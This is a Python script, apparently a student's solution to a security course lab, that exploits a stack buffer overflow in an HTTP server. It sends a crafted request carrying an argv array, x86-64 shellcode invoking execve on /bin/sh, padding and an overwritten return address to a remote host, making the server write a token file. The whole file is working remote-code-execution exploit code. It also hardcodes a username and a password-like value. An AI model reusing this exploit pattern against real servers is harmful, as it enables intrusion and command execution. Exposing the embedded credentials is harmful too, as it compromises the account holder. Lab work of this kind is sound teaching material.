import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET"

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

#PORT = random.randint(10000, 10025)
PORT = 10001

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)

# Fill this in with the address you actually want instead of `0xdeadbeef`
ADDRESS = to_bytes(0x58585612)

USER = b"nmakaya"
PASSWORD = b"6633a5d4c2"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = b"/bin/sh\x00" + b"-c\x00" + b"echo -n \"" + USER + b"\" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"

NULL_ARRAY = to_bytes(0x58585590 + len(SCRIPT)) + to_bytes(0)
SCRIPT += to_bytes(0x00000000)

code_address = 0x58585590 + int(hex(len(SCRIPT)), 16)

argv_address = 0x58585590 + int(hex(1008 - 32), 16)
c_address = 0x58585590 + int(hex(8), 16)
third_address = 0x58585590 + int(hex(11), 16) 



ARRAY = to_bytes(0x58585590) + to_bytes(0x58585590 + 8) + to_bytes(0x58585590 + 11) +  to_bytes(0x0)
BYTES = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\xe2\x55\x58\x58\x48\xc7\xc2\x02\x56\x58\x58\x0f\x05"

print(
    f"argv {hex(0x58585590 + len(SCRIPT))}\n",
     f"null address {hex(0x58585590 + len(SCRIPT) + len(ARRAY))}\n",
    f"code_address {hex(0x58585590 + len(SCRIPT) + len(ARRAY) + len(NULL_ARRAY))}\n" 
)

N = 1008 - len(SCRIPT) - len(ARRAY) - len(BYTES) - len(NULL_ARRAY)
PADDING = b"\xff" * N

# The "exploit string" is what we send in as the headers
HEADERS = SCRIPT + ARRAY + NULL_ARRAY + BYTES + PADDING + ADDRESS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b" " + b"HTTP/1.1\r\n" + HEADERS + b"\r\nConnection: close\r\n\r\n"
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
